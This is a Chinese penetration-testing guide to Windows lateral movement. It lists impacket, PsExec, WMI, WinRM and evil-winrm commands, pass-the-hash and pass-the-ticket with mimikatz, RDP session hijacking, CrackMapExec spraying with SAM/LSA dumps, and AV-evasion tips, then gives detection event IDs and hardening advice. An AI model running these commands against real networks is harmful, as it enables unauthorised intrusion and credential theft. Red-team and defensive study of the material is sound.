# Windows 内网横向移动

## 0x01 概述
横向移动是"拿到一个立足点 + 一批凭证"之后在内网扩大战果的阶段。与域渗透（Kerberos 攻击，见 [PEN-Kerberos](./PEN-Kerberos.md)）的分工：那篇讲"怎么搞到/伪造域内凭证"，本篇讲"凭证到手后怎么跨主机执行"——各手段的原理、前置条件与留下的痕迹。凭证从哪来（mimikatz/抓 hash）见 [PEN-GetHash](./PEN-GetHash.md)，密码复用与社工见 [PEN-Reuse](./PEN-Reuse.md)。

## 0x02 前置：凭证类型与适用性

| 凭证类型 | SMB/WMI/WinRM（远程执行） | RDP 登录 | 备注 |
| --- | --- | --- | --- |
| 明文密码 | ✓ 全协议可用 | ✓ | 万能凭证，优先保住 |
| NTLM Hash | ✓ Pass-the-Hash（impacket `-hashes`） | 仅 Restricted Admin 模式 | 常规 RDP 走 CredSSP 需要明文，hash 登不上 |
| 票据（TGT/AES Key） | ✓ Pass-the-Ticket，走 Kerberos 认证 | ✓（RDP SSO） | 有效期默认 10h；Linux 侧 `.ccache` + `KRB5CCNAME` |
| 证书（pfx） | ✓ 先 PKINIT 换 TGT，之后等同票据 | ✓ 同上 | ADCS 攻击产物，见 [PEN-Kerberos](./PEN-Kerberos.md) 0x09 |

一句话：明文 > 票据/证书 > hash——hash 登不了常规 RDP，但打 SMB/WMI/WinRM 与明文等效。

获取渠道速记：明文密码看 LSASS 内存/网络抓包（受 Credential Guard 影响）、NTLM Hash 看本地 SAM（普通用户权限可读自己的）/LSASS、票据看 LSASS 内存或 krbtgt 相关攻击伪造、证书看 ADCS 误配申请（ESC 系列）。

## 0x03 impacket 远程执行全家桶（核心）

```bash
# psexec.py：通过 ADMIN$ 共享上传服务二进制，注册为服务以 SYSTEM 启动，完整交互 shell
# 痕迹最重：系统日志 7045 服务安装 + 安全日志 4697
psexec.py domain.local/user:'Passw0rd!'@10.0.0.5

# NTLM Hash 版（Pass-the-Hash），lm 位留空
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM> domain.local/user@10.0.0.5

# wmiexec.py：WMI 协议（135 + DCOM 动态端口），不落文件、不装服务，日志少（推荐）
wmiexec.py domain.local/user:'Passw0rd!'@10.0.0.5

# smbexec.py：SMB 命名管道半交互执行，输出经共享文件回传
smbexec.py domain.local/user:'Passw0rd!'@10.0.0.5

# atexec.py：通过 Task Scheduler 服务创建一次性计划任务执行（4698/4702 日志）
atexec.py domain.local/user:'Passw0rd!'@10.0.0.5 whoami

# dcomexec.py：DCOM（默认 MMC20.Application，可 -object 换 ShellWindows/ExcelDDE 等）
dcomexec.py domain.local/user:'Passw0rd!'@10.0.0.5
```

### 对比表

| 工具 | 协议/端口 | 前置条件 | 日志痕迹 | 交互性 |
| --- | --- | --- | --- | --- |
| psexec.py | SMB / 445 | ADMIN$ 可写 + 建服务权限 | 重：7045/4697 服务安装、ADMIN$ 共享访问 | 完整交互 |
| wmiexec.py | DCOM / 135 + 动态 | 目标本地管理员 | 轻：4624(Type 3) 为主 | 半交互 |
| smbexec.py | SMB / 445 | ADMIN$ 可写 | 中：服务安装 + 命名管道 | 半交互 |
| atexec.py | SMB(RPC) / 445 | 建计划任务权限 | 中：4698/4702 计划任务 | 一次性命令 |
| dcomexec.py | DCOM / 135 + 动态 | 目标本地管理员 | 轻：类似 wmiexec | 半交互 |

注意事项：
- 全家桶统一支持 `-hashes`（PTH）与 `-k -no-pass`（Kerberos 票据，配 `KRB5CCNAME`），主机名与票据域名要能对上（写 hosts）
- wmiexec/smbexec 的回显实际走 SMB 回读，445 也得通；防火墙全开的红队场景优先 wmiexec/atexec 组合
- psexec.py 自带 RemComSvc 二进制，落地即被杀软特征匹配，有 EDR 的机器慎用

Kerberos 票据模式示例（配合 [PEN-Kerberos](./PEN-Kerberos.md) 拿到的 ccache）：

```bash
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/user@web01.domain.local
# 注意：-k 模式必须用主机名/FQDN，不能写 IP（Kerberos 的 SPN 匹配要求）
```

### 各工具一句话选型
- 要交互 shell 且不怕痕迹：`psexec.py`（一步到位 SYSTEM）
- 隐蔽优先：`wmiexec.py`（默认无落地文件，仅在 Windows 临时目录留 keytab 类批处理痕迹，可用 `-nooutput` 更静）
- 要 SYSTEM 权限但不想要服务：`atexec.py`（计划任务默认 SYSTEM 运行）
- 445 被封只有 135：`dcomexec.py`（纯 DCOM，不经 SMB）

## 0x04 Windows 原生横向工具

### PsExec（Sysinternals）
原理：向 ADMIN$ 共享拷贝 PSEXESVC.exe，创建并启动 PSEXESVC 服务执行命令，结束后清理。与 psexec.py 同源思路，痕迹同理（7045/4697）。微软签名，杀软容忍度比第三方工具高。

```text
PsExec \\10.0.0.5 -u domain.local\user -p Passw0rd! cmd

:: 常用参数
PsExec \\10.0.0.5 -s cmd                  :: 以 SYSTEM 身份运行
PsExec \\10.0.0.5 -c payload.exe -f       :: 复制程序到远程执行，-f 强制覆盖
PsExec \\10.0.0.5 -i -d notepad           :: 交互式（-i）启动、不等待（-d）
```

### WMI
系统自带、不留文件、不装服务，日志最少；缺点是无回显，输出重定向到文件再回读（或回传到攻击机共享）：

```text
wmic /node:10.0.0.5 /user:domain.local\user /password:Passw0rd! process call create "cmd /c whoami > c:\windows\temp\out.txt"

:: 新系统已移除 wmic，等价 PowerShell：
Invoke-CimMethod -ComputerName 10.0.0.5 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd /c whoami > c:\windows\temp\out.txt'}
```

### WinRM（5985/5986）
WinRM 服务默认 Server 2012+ 开启，是最稳的原生远程通道。5985 为 HTTP、5986 为 HTTPS（证书隧道）。

```text
winrs -r:10.0.0.5 -u:domain.local\user -p:Passw0rd! cmd

:: PowerShell 原生远程
Invoke-Command -ComputerName WEB01 -ScriptBlock { whoami; hostname } -Credential domain.local\user

:: 多主机并行
Invoke-Command -ComputerName (Get-Content hosts.txt) -ScriptBlock { whoami } -ThrottleLimit 20
```

目标侧确认 WinRM 是否可用：

```text
winrm quickconfig                              :: 目标机上开启 WinRM 服务
Test-WSMan -ComputerName 10.0.0.5              :: 从攻击机探测
```

Linux 侧 evil-winrm（支持明文/hash/票据，带上传下载，推荐）：

```bash
evil-winrm -i 10.0.0.5 -u user -p 'Passw0rd!'
evil-winrm -i 10.0.0.5 -u user -H <NTLM>       # PTH
```

### 远程计划任务

```text
schtasks /s 10.0.0.5 /create /tn pentest /tr "cmd /c whoami > c:\windows\temp\out.txt" /ru SYSTEM /sc once /st 23:00
schtasks /s 10.0.0.5 /run /tn pentest            :: 立即触发
schtasks /s 10.0.0.5 /query /tn pentest          :: 看执行状态
schtasks /s 10.0.0.5 /delete /tn pentest /f      :: 清理痕迹
```

### RDP 相关

```text
mstsc /v:10.0.0.5

:: 会话劫持：拿到 SYSTEM 后无需密码接管其他已登录会话
query user                          :: 查会话 ID
tscon 1 /dest:console               :: 把会话 1 切到本地控制台（需 SYSTEM）

:: Restricted Admin：用 NTLM hash 直接登 RDP（无需明文），需服务端开启（默认支持）
mstsc /v:10.0.0.5 /restrictedadmin
```

- Restricted Admin 登录要求账户是目标本地管理员；失败回退 `mstsc /h` 报 NLA 错误，注册表 `DisableRestrictedAdmin=1` 表示被禁
- 会话劫持（tscon）不出 4624 Type 10，是经典"无凭证拿会话"姿势

## 0x05 常见横向路径选型

| 手上有什么 | 优先路径 |
| --- | --- |
| 只有 NTLM Hash | impacket 全家 `-hashes`（PTH）；Windows 侧 mimikatz 起伪造会话后接原生工具 |
| 拿到票据（TGT/ST） | Pass-the-Ticket：mimikatz 注入 kirbi / Linux 侧 ccache |
| 目标开了 3389 | RDP：明文直接登；只有 hash 走 /restrictedadmin |
| 仅目标本地管理权限 | WMI 优先（wmiexec/原生 wmic，日志最少），次选 WinRM |
| 目标有杀软 | 绕落地：rundll32 加载、微软签名测试工具（如 te.exe）、CS/Sliver 内存执行；避开 psexec.py 自带二进制 |

mimikatz PTH 详细（伪造 NTLM 会话后，新进程可跨主机认证）：

```text
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:<hash> /run:cmd.exe
:: 在弹出的 cmd 里跑 psexec/wmic/xcopy，即以该 hash 身份访问远程主机
```

票据传递（详见 [PEN-Kerberos](./PEN-Kerberos.md) 0x0A）：

```text
mimikatz "kerberos::ptt ticket.kirbi"
```

补充两个细分场景：
- **Overpass-the-Hash**：只有 hash 但想走 Kerberos（绕 NTLM 检测）——`sekurlsa::pth` 加 `/aes256:<key>` 直接换取票据会话，适合目标域禁用 NTLM 的环境
- **DCSync 拿全域凭证后**：不必逐台横向，直接黄金票据打域控（见 [PEN-Kerberos](./PEN-Kerberos.md) 0x06），横向是过程、控域是目的

## 0x06 横向前的信息收集
一句话：先用 BloodHound 找"当前权限 → 目标"的最短攻击路径（见 [PEN-BloodHound](./PEN-BloodHound.md)），再用 CrackMapExec（社区维护版 NetExec）批量验证凭证有效性，顺手收割更多凭证：

```bash
# 凭证喷洒验证：显示 Pwn3d! 即该凭证在目标上是本地管理员
crackmapexec smb 10.0.0.0/24 -u user -p 'Passw0rd!'

# 拿下后直接 dump：--sam（本地账户 hash）、--lsa（LSA secrets，可能含历史明文）
crackmapexec smb 10.0.0.0/24 -u user -p 'Passw0rd!' --sam
crackmapexec smb 10.0.0.0/24 -u user -p 'Passw0rd!' --lsa

# 顺手枚举目标上可用信息：已登录用户（找跳板会话）、共享、本地用户组
crackmapexec smb 10.0.0.0/24 -u user -p 'Passw0rd!' --sessions --shares --users

# 探测网段存活与服务（WinRM 开没开一目了然）
crackmapexec winrm 10.0.0.0/24 -u user -p 'Passw0rd!' --continue-on-success
```

内网存活与端口探测见 [PEN-Scanner](./PEN-Scanner.md)，权限维持与痕迹清理见 [PEN-WinClear](./PEN-WinClear.md)。

## 0x07 防御与检测
### 4624 登录类型速查

| LogonType | 含义 | 典型来源 |
| --- | --- | --- |
| 2 | 交互式 | 本地键盘登录 |
| 3 | 网络 | SMB/WMI/共享访问（psexec/wmiexec/atexec 首跳都是 Type 3） |
| 4 | Batch | 计划任务（atexec 落地后） |
| 5 | 服务 | 服务启动（psexec 的 PSEXESVC） |
| 9 | NewCredentials | runas /netonly、mimikatz PTH 的典型指纹 |
| 10 | RemoteInteractive | RDP 登录 |
| 11 | CachedInteractive | 缓存凭据离线登录 |

### impacket 检测特征
- 服务安装事件（系统日志 7045 / 安全日志 4697）：服务名/二进制路径随机（如 `ABCDEFGH.exe`）、无描述、路径在 `%SystemRoot%` 下——psexec.py/smbexec.py 典型指纹
- ADMIN$/IPC$ 共享访问（5140/5145）后紧跟服务创建，顺序组合告警
- 计划任务批量创建/更新（4698/4702）且执行内容含 `cmd /c`：atexec.py 特征
- 4624 Type 3 登录源 IP 不在运维网段、单账户短时间横向多台主机
- EDR 侧：Python 打包 exe 的导入表/内存特征，impacket 明文脚本极易被静态识别

### 加固
- 网络分段：服务器区与管理网隔离，445/135/5985 不对办公网开放，跨区走跳板机
- 管理账户不跨主机复用；本地管理员密码唯一化——LAPS（每台机器随机密码，AD 集中分发，泄露一台不伤全局）
- 强制 SMB 签名（防 relay）；开启 PowerShell 脚本块日志（4104）捕捉 Invoke-Command 载荷
- 监控高价值账户的 Type 3/9/10 登录异动，蜜罐共享/服务谁碰谁告警

## 0x08 参考
- [Impacket](https://github.com/fortra/impacket)
- [PsExec - Microsoft Sysinternals](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [HackTricks - Lateral Movement](https://book.hacktricks.xyz/windows-hardening/lateral-movement)
- [NetExec（CrackMapExec 维护版）](https://github.com/Pennyw0rth/NetExec)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [MITRE ATT&CK T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/)
